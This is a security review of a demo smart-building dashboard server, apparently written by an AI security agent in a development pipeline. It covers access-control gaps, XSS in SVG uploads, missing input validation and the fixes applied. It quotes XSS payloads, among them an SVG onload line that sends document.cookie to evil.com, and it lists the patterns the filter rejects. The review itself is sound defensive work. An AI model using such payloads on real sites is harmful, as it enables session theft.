# 09 — Security Review v2: Platform Enhancement Security Assessment

> **Project Code**: `20260414_Smart_Building_Dashboard`
> **Version**: 2.0
> **Created**: 2026-04-16
> **Author**: Security Agent (Stage 9)
> **Status**: Complete — Fixes Applied

---

## 1. Security Review Scope

### Assessed Files and Components
| File | Lines | Description |
|------|-------|-------------|
| `demo-server.mjs` | ~1150 | Full backend — auth, RBAC, all API routes, data stores |

### Threat Surfaces Considered
- **Authentication**: JWT login flow, token refresh, session cookies
- **Authorization**: RBAC via `checkAccess()`, technician zone restrictions
- **Input Handling**: POST/PUT body parsing, query parameter filtering, file uploads
- **Data Exposure**: API response content, user PII, sensor data
- **Configuration**: Storm detection thresholds, suppression rules
- **Denial of Service**: Body size limits, query parameter abuse

### Assumptions and Limitations
- This is a demo/mock server using in-memory data — no database, no external dependencies
- Passwords stored in plaintext and JWT secret is hardcoded — acceptable for demo, not production
- No HTTPS — acceptable for localhost demo only
- Assessment focuses on the v2 enhancements: storm detection, incidents, floor plans, RBAC

### Evidence Sources Reviewed
- `demo-server.mjs` — full source code (~1150 lines)
- `.artifacts/06-coder-plan-v2.md` — implementation spec
- `.artifacts/07-qa-test-plan-v2.md` — QA findings and RBAC matrix

---

## 2. Vulnerability List

### V-01: Technicians Could View/Resolve Incidents Outside Assigned Zones
| Field | Value |
|-------|-------|
| **Category** | A01 — Broken Access Control |
| **Severity** | **HIGH** |
| **Affected Code** | `demo-server.mjs` — `GET /alerts/incidents/:id`, `PATCH /alerts/incidents/:id/resolve` |
| **Attack Scenario** | A technician enumerates incident IDs and views/resolves incidents on floors they are not assigned to (e.g., Executive Suite on 2nd Floor). The list endpoint (`GET /alerts/incidents`) correctly filters by zone, but the detail and resolve endpoints did not. |
| **Impact** | Horizontal privilege escalation — technicians can interfere with incidents outside their responsibility, potentially disrupting other teams' workflows or hiding critical events. |
| **Fix Applied** | **YES** — Added zone check: if `user.role === 'technician'`, verify `inc.affectedZones` overlaps with `getAssignedZones(user)`, return 403 otherwise. |

### V-02: Technicians Could Acknowledge/Resolve Alerts Outside Assigned Zones
| Field | Value |
|-------|-------|
| **Category** | A01 — Broken Access Control |
| **Severity** | **HIGH** |
| **Affected Code** | `demo-server.mjs` — `PATCH /alerts/:id/acknowledge`, `PATCH /alerts/:id/resolve` |
| **Attack Scenario** | A technician who knows an alert ID (e.g., from a colleague) can acknowledge or resolve it even if the alert is in zone z5–z8 (not in their assigned zones z1–z4). Previously, the endpoint only checked role, not zone. Additionally, acknowledging/resolving a nonexistent alert ID returned 200 success silently. |
| **Impact** | Technicians could suppress alerts in areas they shouldn't access. Combined with the silent-success-on-missing-alert bug, a technician couldn't tell if the action actually worked. |
| **Fix Applied** | **YES** — Added zone check for technicians on both endpoints. Also added 404 response when alert ID is not found. |

### V-03: Storm Config Accepted Zero/Negative Thresholds
| Field | Value |
|-------|-------|
| **Category** | A04 — Insecure Design |
| **Severity** | **HIGH** |
| **Affected Code** | `demo-server.mjs` — `PUT /alerts/storm-config` |
| **Attack Scenario** | A malicious or careless sys_admin sets `stormThreshold: 0`, causing every single alert to trigger storm mode (all info/warning alerts suppressed). Or sets `windowSeconds: 0`, potentially causing division-by-zero in rate calculations. Or sets `suppressionRules.critical: 'suppress'` to silently drop critical safety alerts. |
| **Impact** | Complete bypass of alert storm protection — either always-on (suppressing all alerts) or broken configuration leading to missed critical safety events. |
| **Fix Applied** | **YES** — Added bounds validation: `stormThreshold: 1–10000`, `windowSeconds: 10–3600`, `batchIntervalSeconds: 5–600`, `cooldownSeconds: 10–3600`. Suppression rule values validated against enum `['suppress', 'aggregate', 'passthrough']` and keys against `['info', 'warning', 'critical']`. |

### V-04: SVG Floor Plan Upload — XSS Risk
| Field | Value |
|-------|-------|
| **Category** | A03 — Injection (XSS) |
| **Severity** | **HIGH** |
| **Affected Code** | `demo-server.mjs` — `POST /floor-plans`, `PUT /floor-plans/:id` |
| **Attack Scenario** | An admin uploads an SVG file containing `<script>alert('XSS')</script>` or `<svg onload="fetch('https://evil.com/steal?c='+document.cookie)">`. When the SVG is rendered in another user's browser (e.g., on the floor plan viewer), arbitrary JavaScript executes in their session, stealing tokens or performing actions as the victim. |
| **Impact** | Stored XSS — session hijacking, data exfiltration, privilege escalation if a higher-privileged user views the floor plan. |
| **Fix Applied** | **YES** — Added server-side rejection of SVG data containing `<script>`, `on*=` event handlers, `javascript:` URIs, and `data:text/html` xlink references. Returns 400 with descriptive error. Applied to both POST and PUT routes. |

### V-05: No Request Body Size Limit
| Field | Value |
|-------|-------|
| **Category** | A04 — Insecure Design / DoS |
| **Severity** | **MEDIUM** |
| **Affected Code** | `demo-server.mjs` — `parseBody()` function |
| **Attack Scenario** | An attacker sends a multi-gigabyte POST body, exhausing server memory and causing Node.js to crash (OOM kill). |
| **Impact** | Denial of Service — server becomes unresponsive. |
| **Fix Applied** | **YES** — Added 2 MB body size limit. Requests exceeding the limit receive 413 Payload Too Large. |

### V-06: User Registration Lacked Input Validation
| Field | Value |
|-------|-------|
| **Category** | A07 — Identification and Authentication Failures |
| **Severity** | **MEDIUM** |
| **Affected Code** | `demo-server.mjs` — `POST /auth/register` |
| **Attack Scenario** | A sys_admin creates a user with `role: 'superuser'` (arbitrary string) bypassing the RBAC model, or creates duplicate accounts with the same email, or sets empty passwords. |
| **Impact** | RBAC bypass via invalid role strings, account confusion from duplicate emails, weak passwords allowing brute-force. |
| **Fix Applied** | **YES** — Added validation: required fields (email, name, password), email format regex, duplicate email check (returns 409), role whitelist (`sys_admin`, `financial_decision_maker`, `technician`), minimum password length (6 chars), name length limit (1–100). |

### V-07: `PUT /users/me` — No Input Validation
| Field | Value |
|-------|-------|
| **Category** | A03 — Injection (Stored XSS) |
| **Severity** | **MEDIUM** |
| **Affected Code** | `demo-server.mjs` — `PUT /users/me` |
| **Attack Scenario** | A user updates their name to `<img src=x onerror=alert(1)>`. If this name is rendered in other users' dashboards (e.g., "Generated by: [name]" in PDF reports or UI), it becomes stored XSS. |
| **Impact** | Stored XSS affecting other users who view the attacker's name. |
| **Fix Applied** | **NO** — Recommend adding name length validation and HTML character stripping. Low exploitability in demo context (PDFs escape content, JSON responses don't render HTML). |

### V-08: Hardcoded JWT Secret
| Field | Value |
|-------|-------|
| **Category** | A02 — Cryptographic Failures |
| **Severity** | **LOW** (demo context) |
| **Affected Code** | `demo-server.mjs` line 10 — `const JWT_SECRET = 'demo-secret-key-not-for-production'` |
| **Attack Scenario** | Anyone with access to source code can forge valid JWT tokens for any user/role. |
| **Impact** | Complete authentication bypass in production. Acceptable for demo. |
| **Fix Applied** | **NO** — Expected for demo. In production, must read from environment variable. |

### V-09: Plaintext Password Storage
| Field | Value |
|-------|-------|
| **Category** | A02 — Cryptographic Failures |
| **Severity** | **LOW** (demo context) |
| **Affected Code** | `demo-server.mjs` lines 23–25 — `password: 'admin123'` etc. |
| **Attack Scenario** | If any data exposure occurs, passwords are immediately compromised. |
| **Impact** | Credential theft. Acceptable for demo (in-memory only). |
| **Fix Applied** | **NO** — Expected for demo. Production requires bcrypt/argon2 hashing. |

### V-10: CORS Allows Credentials from Fixed Origin
| Field | Value |
|-------|-------|
| **Category** | A05 — Security Misconfiguration |
| **Severity** | **LOW** |
| **Affected Code** | `demo-server.mjs` — `json()` function, CORS headers |
| **Attack Scenario** | Currently hardcoded to `http://localhost:5001`. In production, dynamic origin validation or env-based configuration is required. |
| **Impact** | None currently (correct for demo). Risk if deployed without updating. |
| **Fix Applied** | **NO** — Acceptable for demo. Document for production deployment. |

---

## 3. OWASP Control Assessment

| # | OWASP Category | Status | Notes |
|---|----------------|--------|-------|
| A01 | Broken Access Control | **PASS** (after fixes) | All routes have RBAC. Zone-scoped access for technicians now enforced on all mutating endpoints. 4 read-only endpoints intentionally public to authenticated users (`/floors`, `/buildings/geospatial`, `/floor-plans/:id/rooms`, `/floor-plans/:id/sensors`). |
| A02 | Cryptographic Failures | **PARTIAL** | JWT uses HMAC-SHA256 (good algorithm), but secret is hardcoded and passwords are plaintext. Acceptable for demo. |
| A03 | Injection | **PASS** (after fixes) | SVG upload now validated against XSS payloads. JSON parsing is safe (no SQL, no command injection possible in pure in-memory demo). CSV export uses server-generated data only. |
| A04 | Insecure Design | **PASS** (after fixes) | Storm config now validates bounds. Body size limits enforced. Registration validates all inputs. |
| A05 | Security Misconfiguration | **PASS** | CORS properly restricted. HttpOnly cookies for refresh tokens. SameSite=Lax set. No debug endpoints exposed. |
| A06 | Vulnerable/Outdated Components | **PASS** | Zero external dependencies. Uses only `node:http` and `node:crypto` built-in modules. |
| A07 | Authentication Failures | **PASS** (after fixes) | JWT expiry enforced (15 min access, 7 day refresh). Registration now validates email format, password length, and prevents duplicates. |
| A08 | Software/Data Integrity | **PASS** | JWT signature verified with HMAC-SHA256. No deserialization of untrusted data beyond JSON.parse (safe). |
| A09 | Logging/Monitoring | **PARTIAL** | Errors are caught and logged with `console.error`. No structured logging, no audit trail for security-sensitive actions (login, RBAC denial, data mutations). Acceptable for demo. |
| A10 | SSRF | **PASS** | No outbound HTTP requests made by the server. No user-controlled URLs processed. |

---

## 4. API and Authentication Security

### API Attack Surface
- **35+ endpoints** assessed, all requiring authentication (except `/health`)
- All write endpoints (`POST`, `PUT`, `PATCH`, `DELETE`) have role-based access control
- Query parameter filtering (`status`, `severity`, `startDate`, etc.) uses safe string comparison — no injection possible

### Authentication Weaknesses
- **Token lifetime**: Access token = 15 min (good), Refresh token = 7 days (acceptable)
- **No token revocation**: Logout clears cookie but doesn't invalidate server-side. Acceptable for demo (stateless JWT).
- **No brute-force protection**: Login endpoint has no rate limiting. In production, add rate limiting per IP/email.
- **No account lockout**: Failed login attempts not tracked.

### Session/Token Handling
- Refresh token stored as HttpOnly cookie — **good** (not accessible via JavaScript)
- SameSite=Lax — **good** (prevents CSRF on state-changing requests)
- No Secure flag on cookie — **acceptable** for localhost HTTP, must add for production HTTPS

### Input Validation Summary
| Endpoint | Validated | Notes |
|----------|-----------|-------|
| `POST /auth/login` | ✅ | Email/password checked against store |
| `POST /auth/register` | ✅ (after fix) | Email format, uniqueness, role whitelist, password length |
| `POST /floor-plans` | ✅ (after fix) | Required fields, SVG XSS scan, label length |
| `PUT /floor-plans/:id` | ✅ (after fix) | SVG XSS scan on fileData |
| `PUT /alerts/storm-config` | ✅ (after fix) | Numeric bounds, enum validation |
| `POST /alerts/rules` | ⚠️ Partial | No validation on `name` length or `groupBy` array contents |
| `POST /floor-plans/:id/rooms` | ⚠️ Partial | No validation on numeric fields (x, y, width, height) |
| `PUT /users/me` | ⚠️ Partial | No name length/character validation |
| `POST /hse/checklist` | ⚠️ Partial | No validation that `answers` object has required keys |
| `POST /hse/ppe-check` | ⚠️ Partial | No validation on `score` range or `items` structure |

---

## 5. Dependency Security

| Aspect | Status |
|--------|--------|
| External dependencies | **None** — zero `node_modules`, backend is pure `node:http` + `node:crypto` |
| Known CVEs | **N/A** — no third-party packages to scan |
| Lock file | **N/A** — no package-lock.json needed for backend |
| Node.js version | Should target LTS (v20+) in production |

**Assessment**: No dependency-related risks. The zero-dependency architecture is a strong security posture.

---

## 6. Security Fixes Applied

### Fix 1: Body Size Limit (V-05)
- **File**: `demo-server.mjs` — `parseBody()` function
- **Before**: Unlimited body accumulation in memory
- **After**: 2 MB limit with `PAYLOAD_TOO_LARGE` error (413 status) when exceeded
- **Verify**: `curl -X POST -d @large_file localhost:5000/api/v1/auth/login` → 413

### Fix 2: Storm Config Validation (V-03)
- **File**: `demo-server.mjs` — `PUT /alerts/storm-config` handler
- **Before**: Any value accepted — `stormThreshold: 0` or `suppressionRules.critical: 'suppress'` allowed
- **After**: Bounds validation (threshold: 1–10000, windows: 10–3600s, etc.), suppression rule keys and values validated against enums
- **Verify**: `PUT /alerts/storm-config` with `{"stormThreshold": 0}` → 400 validation error

### Fix 3: SVG XSS Prevention — POST (V-04)
- **File**: `demo-server.mjs` — `POST /floor-plans` handler
- **Before**: Raw `fileData` stored without inspection
- **After**: Rejects SVGs containing `<script>`, `on*=` event handlers, `javascript:` URIs, `data:text/html` xlinks
- **Verify**: POST floor plan with `fileData: '<svg><script>alert(1)</script></svg>'` → 400

### Fix 4: SVG XSS Prevention — PUT (V-04)
- **File**: `demo-server.mjs` — `PUT /floor-plans/:id` handler
- **Before**: Raw `fileData` accepted on update
- **After**: Same XSS pattern rejection as POST
- **Verify**: PUT floor plan with malicious SVG → 400

### Fix 5: Incident Zone Enforcement (V-01)
- **File**: `demo-server.mjs` — `GET /alerts/incidents/:id` and `PATCH /alerts/incidents/:id/resolve`
- **Before**: Any technician could view/resolve any incident regardless of zone assignment
- **After**: Technicians can only view/resolve incidents where `affectedZones` overlaps their assigned zones (z1–z4)
- **Verify**: Login as technician → `GET /alerts/incidents/inc-3` (if inc-3 has zones outside z1–z4) → 403

### Fix 6: Alert Zone Enforcement (V-02)
- **File**: `demo-server.mjs` — `PATCH /alerts/:id/acknowledge` and `PATCH /alerts/:id/resolve`
- **Before**: Any technician could acknowledge/resolve any alert; missing alerts returned 200 success
- **After**: Technicians can only act on alerts in their assigned zones; missing alert returns 404
- **Verify**: Login as technician → resolve alert in zone z5 → 403; resolve nonexistent alert → 404

### Fix 7: Registration Validation (V-06)
- **File**: `demo-server.mjs` — `POST /auth/register`
- **Before**: No field validation, arbitrary roles, duplicate emails allowed
- **After**: Required fields, email format regex, duplicate check (409), role whitelist, password min-length (6), name length limit
- **Verify**: Register with `role: 'superuser'` → 400; register with existing email → 409

---

## 7. Remediation Plan

### Immediate Critical Fixes — ALL APPLIED ✅
All 7 critical/high fixes have been applied directly to `demo-server.mjs`.

### Short-Term Hardening (Pre-Production)
| # | Action | Effort | Priority |
|---|--------|--------|----------|
| 1 | Add name validation to `PUT /users/me` (length, HTML strip) | Low | Medium |
| 2 | Add validation to `POST /alerts/rules` (name length, groupBy contents) | Low | Medium |
| 3 | Add validation to `POST /floor-plans/:id/rooms` (numeric bounds) | Low | Medium |
| 4 | Add rate limiting on `POST /auth/login` (ip-based, 5 attempts/min) | Medium | High |
| 5 | Add audit logging for security events (login, RBAC denial, data mutations) | Medium | High |
| 6 | Validate `POST /hse/checklist` answer structure against expected schema | Low | Low |

### Long-Term Security Improvements (Production)
| # | Action | Effort | Priority |
|---|--------|--------|----------|
| 1 | Replace hardcoded JWT_SECRET with env variable | Low | Critical |
| 2 | Replace plaintext passwords with bcrypt/argon2 hashing | Medium | Critical |
| 3 | Add `Secure` flag to refresh token cookie (requires HTTPS) | Low | High |
| 4 | Implement CSP headers (Content-Security-Policy) | Medium | High |
| 5 | Add server-side token revocation (blacklist on logout) | Medium | Medium |
| 6 | Add structured JSON logging with correlation IDs | Medium | Medium |
| 7 | Implement account lockout after failed login attempts | Medium | Medium |
| 8 | Add CSRF token for cookie-based auth flows | Medium | Medium |

### Verification/Retest Checklist
- [ ] Technician cannot view incident outside zones z1–z4 → 403
- [ ] Technician cannot resolve incident outside zones z1–z4 → 403
- [ ] Technician cannot acknowledge alert outside zones z1–z4 → 403
- [ ] Technician cannot resolve alert outside zones z1–z4 → 403
- [ ] `PUT /alerts/storm-config` with `stormThreshold: 0` → 400
- [ ] `PUT /alerts/storm-config` with `stormThreshold: -5` → 400
- [ ] `PUT /alerts/storm-config` with `suppressionRules.critical: 'suppress'` → accepted (valid value, but admin's choice)
- [ ] `PUT /alerts/storm-config` with `suppressionRules.critical: 'drop'` → 400
- [ ] `POST /floor-plans` with SVG containing `<script>` → 400
- [ ] `POST /floor-plans` with SVG containing `onload=` → 400
- [ ] `POST /floor-plans` with clean SVG → 201 success
- [ ] `POST /auth/register` with `role: 'superuser'` → 400
- [ ] `POST /auth/register` with duplicate email → 409
- [ ] `POST /auth/register` with password `'ab'` (too short) → 400
- [ ] Large payload (>2MB) on any POST endpoint → 413
- [ ] Nonexistent alert acknowledge → 404
- [ ] Nonexistent alert resolve → 404

---

## 8. Collaboration Handoff

### Actions for Coder (Unfixed Items)
1. Add name validation/sanitization to `PUT /users/me` — limit to 100 chars, strip HTML tags
2. Add validation to `POST /alerts/rules` — rule name max 200 chars, `groupBy` array items from allowed enum
3. Add validation to `POST /floor-plans/:id/rooms` — numeric bounds for x, y, width, height (0–100)
4. Add rate limiting middleware for login endpoint before production deployment

### Validation Focus for QA
1. **Re-test all technician zone boundaries** — incident detail, incident resolve, alert acknowledge, alert resolve must return 403 for out-of-zone resources
2. **Re-test storm config** — verify bounds validation rejects 0, negative, and out-of-range values
3. **Re-test floor plan upload** — verify XSS payloads in SVG are rejected, clean SVGs are accepted
4. **Re-test registration** — verify all validation rules (email, role, password, duplicates)
5. **Test body size limit** — send >2MB POST body, verify 413 response

### Residual Risks
- **LOW**: `PUT /users/me` accepts arbitrary name strings (mitigated by JSON response context — names only appear in JSON or PDF-escaped contexts)
- **LOW**: No audit trail for who changed storm config or resolved incidents (acceptable for demo, needed for production)
- **LOW**: Refresh token cookie lacks `Secure` flag (localhost HTTP only)

### Release Decision
**Conditional GO** ✅ — All HIGH-severity vulnerabilities have been patched. The 6 remaining MEDIUM/LOW items are acceptable for a demo environment and documented in the remediation plan. No blocking security issues remain.

---

## 9. RBAC Gap Analysis

### Route-Level RBAC Coverage: 100% ✅

All 35+ protected routes have `checkAccess()` enforcement.

**Intentionally RBAC-exempt (read-only, authenticated-only):**
| Endpoint | Rationale |
|----------|-----------|
| `GET /floors` | Building structure — harmless metadata, needed by all roles |
| `GET /buildings/geospatial` | Single building data — needed by all roles for map view |
| `GET /floor-plans/:id/rooms` | Read-only room geometry — needed for all floor plan views |
| `GET /floor-plans/:id/sensors` | Read-only sensor positions — needed for all floor plan views |
| `PUT /users/me` | Self-update — any authenticated user can update their own name |

### Zone-Level Access Enforcement (Technician Scoping)
| Endpoint | Zone Check | Status |
|----------|------------|--------|
| `GET /alerts` | ✅ Filter by assigned zones | PASS |
| `PATCH /alerts/:id/acknowledge` | ✅ Reject if alert zone ∉ assigned | PASS (fixed) |
| `PATCH /alerts/:id/resolve` | ✅ Reject if alert zone ∉ assigned | PASS (fixed) |
| `GET /alerts/incidents` | ✅ Filter by affected zones | PASS |
| `GET /alerts/incidents/:id` | ✅ Reject if no zone overlap | PASS (fixed) |
| `PATCH /alerts/incidents/:id/resolve` | ✅ Reject if no zone overlap | PASS (fixed) |

### Role Access Matrix (Verified via Code Audit)
| Endpoint | sys_admin | financial_decision_maker | technician |
|----------|-----------|--------------------------|------------|
| `/dashboard/executive` | ✅ | ✅ | ❌ 403 |
| `/dashboard/operations` | ✅ | ❌ 403 | ❌ 403 |
| `/dashboard/technician` | ✅ | ❌ 403 | ✅ |
| `/energy/*` (3 routes) | ✅ | ✅ | ❌ 403 |
| `/zones/environmental` | ✅ | ❌ 403 | ✅ |
| `/equipment` + `/:id` | ✅ | ❌ 403 | ✅ |
| `/alerts` (GET) | ✅ | ❌ 403 | ✅ (zone-scoped) |
| `/alerts/:id/acknowledge` | ✅ | ❌ 403 | ✅ (zone-scoped) |
| `/alerts/:id/resolve` | ✅ | ❌ 403 | ✅ (zone-scoped) |
| `/alerts/storm-status` | ✅ | ❌ 403 | ✅ |
| `/alerts/incidents` | ✅ | ❌ 403 | ✅ (zone-scoped) |
| `/alerts/incidents/:id` | ✅ | ❌ 403 | ✅ (zone-scoped) |
| `/alerts/incidents/:id/resolve` | ✅ | ❌ 403 | ✅ (zone-scoped) |
| `/alerts/rules` (GET/POST) | ✅ | ❌ 403 | ❌ 403 |
| `/alerts/storm-config` (PUT) | ✅ | ❌ 403 | ❌ 403 |
| `/floor-plans` (GET) | ✅ | ✅ | ✅ |
| `/floor-plans` (POST) | ✅ | ❌ 403 | ❌ 403 |
| `/floor-plans/:id` (PUT/DELETE) | ✅ | ❌ 403 | ❌ 403 |
| `/floor-plans/:id/rooms` (POST) | ✅ | ❌ 403 | ❌ 403 |
| `/floor-plans/:id/sensors/:id` (PUT) | ✅ | ❌ 403 | ❌ 403 |
| `/reports/*` (5 routes) | ✅ | ✅ | ❌ 403 |
| `/users` (GET) | ✅ | ❌ 403 | ❌ 403 |
| `/users/:id` (PATCH) | ✅ | ❌ 403 | ❌ 403 |
| `/knowledge-base/*` | ✅ | ❌ 403 | ✅ |
| `/hse/*` (6 routes) | ✅ | ❌ 403 | ✅ |

---

## 10. Handoff

- **Inputs consumed**: `demo-server.mjs`, `.artifacts/06-coder-plan-v2.md`, `.artifacts/07-qa-test-plan-v2.md`
- **Outputs produced**: `.artifacts/09-security-review-v2.md`, `demo-server.mjs` (7 security patches applied)
- **Open questions**:
  1. Should `suppressionRules.critical: 'suppress'` be blocked? Currently valid per enum, but allows an admin to intentionally silence critical alerts. Recommend a confirmation UI prompt on the frontend.
  2. Should `GET /floor-plans/:id/rooms` and `/sensors` have explicit per-role RBAC? Currently any authenticated user can read — acceptable for floor plan viewing but discuss with product.
- **Go/No-Go**: **Conditional GO** ✅ — All HIGH/CRITICAL vulnerabilities fixed. Remaining MEDIUM/LOW items are non-blocking for demo release. DevOps may proceed with pipeline integration.
